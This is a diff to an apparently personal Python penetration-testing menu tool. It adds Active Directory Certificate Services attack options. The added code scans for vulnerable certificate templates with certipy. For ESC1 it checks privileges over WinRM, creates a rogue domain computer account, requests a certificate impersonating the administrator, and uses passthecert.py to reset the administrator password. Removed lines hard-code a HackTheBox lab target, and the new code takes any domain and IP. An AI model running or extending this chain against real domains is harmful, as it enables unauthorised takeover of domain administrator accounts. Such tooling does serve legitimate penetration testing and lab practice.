@@ -518,7 +518,6 @@ def catsFile(variable):
       localCOM("cat " + variable)
       localCOM("echo '" + Reset + "'")
    else:
-      # print("[-] Empty File...")
       pass
    return   
    
@@ -781,7 +780,7 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Gold Ticket (71) ServScanner (81) gRPClient   (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) Nuclei Scanner (600) LFI OS Checker (700) Certipy LIST (710) Certipy ESC10    " + '\u2551')   
+   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Gold Ticket (71) ServScanner (81) gRPClient   (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) Nuclei Scanner (600) LFI OS Checker (700) Certipy VULN (710) Certipy ESC10    " + '\u2551')   
    print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Gold DC PAC (72) VulnScanner (82)             (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) Nuclei WP Scan (601) LFI   Wordlist (701) Certipy ESC1 (711) Certipy ESC11    " + '\u2551')      
    print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Domain Dump (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (502) Wordpress Scan (602) Nuclei LFI     (702) Certipy ESC2                        " + '\u2551')   
    print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Blood Hound (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (503) WP Plugin Scan (603)                (703) Certipy ESC3                        " + '\u2551')
@@ -4343,48 +4342,65 @@ while True:
       localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
       localCOM("xdotool type 'bloodhound'; xdotool key Return")
       localCOM("xdotool key Ctrl+Tab") 
-      prompt()    
+      prompt()   
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Certipy parsFile
+# Details : Menu option selected - Certipy - vulnerabities
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='700':
+      print(colored("[*] Checking ADCS misconfigurations...", colour3))     
+      remoteCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -vulnerable -stdout") 
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy EC01
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='701':
-      print(colored("[*] Checking privilges...", colour3))      
-      remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
-      catsFile("priv.tmp")
-      with open("priv.tmp") as file:
-         contents = file.read()
-         if "SeMachineAccountPrivilege" in contents:
-            print(colored("[*] Creating new Domain Computer...", colour3))
-            localCOM(keyPath + "addcomputer.py -computer-name shtnx_pc -computer-pass 1234 authority.htb/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -dc-ip " + TIP.rstrip(" "))
-#             print(colored("[*] Checking certificate authorities...", colour3))            
-#             localCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -dc-only -stdout > test.tmp")
-#             localCOM("cat test.tmp | grep  'Certificate Authorities'")
-#             authority = input("\n[?] Please enter authority name to assign: ")
-#             print("") 
-            localCOM("certipy req -username 'shtnx_pc$' -p 1234 -dc-ip 10.10.11.222 -ca AUTHORITY-CA -upn administrator@authority.htb -template CorpVPN -debug")
-            localCOM("certipy cert -pfx administrator.pfx -nokey -out user.crt")
-            localCOM("certipy cert -pfx administrator.pfx -nocert -out user.key")
-            localCOM("python3 passthecert.py -crt user.crt -key user.key -dc-ip 10.10.11.222 -domain authority.htb -action whoami")
-            localCOM("python3 passthecert.py -crt user.crt -key user.key -dc-ip 10.10.11.222 -domain authority.htb -action modify_user -target administrator -new-pass hackeD1!")
-         else:
-            print("[-] SeMachineAccountPrivilege is not enabled...")
+      print("[!] ESC1 is when a certificate template permits Client Authentication, and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN)...\n")      
+      checkParams = test_TIP()
+      if checkParams != 1:
+         checkParams = test_DOM()      
+      if checkParams != 1:      
+         print(colored("[*] Checking privilges...", colour3))
+         remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
+         catsFile("priv.tmp")
+         with open("priv.tmp") as file:
+            contents = file.read()
+            if "SeMachineAccountPrivilege" in contents:
+               print(colored("[*] Creating new Domain Computer...", colour3))
+               localCOM(keyPath + "addcomputer.py -computer-name shtnx_pc -computer-pass 1234 " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" "))
+               print(colored("[*] Enrolling into the vulnerable template, and supplying a SAN...", colour3)) 
+               group = input("\n[?] Please enter group name to assign: ")
+               localCOM("certipy req -username 'shtnx_pc$' -p 1234 -dc-ip " + TIP.rstrip(" ") + " -ca AUTHORITY-CA -upn administrator@" + DOM.rstrip(" ") + " -template " + group +" -debug")               
+               localCOM("certipy cert -pfx administrator.pfx -nokey -out user.crt")
+               localCOM("certipy cert -pfx administrator.pfx -nocert -out user.key")
+               localCOM(keyPath + "passthecert.py -crt user.crt -key user.key -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -action whoami")
+               localCOM(keyPath + "passthecert.py -crt user.crt -key user.key -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -action modify_user -target administrator -new-pass H@ck3r!!!")
+            else:
+               print("[-] SeMachineAccountPrivilege is not enabled...")
       prompt()  
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Certipy parsFile
+# Details : Menu option selected - Certipy EC02
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='702':
+   if selection =='703':
+      print("[!] ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.\n")
+#     ADD checkParams here...      
       print(colored("[*] Checking privilges...", colour3))      
       remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
       catsFile("priv.tmp")
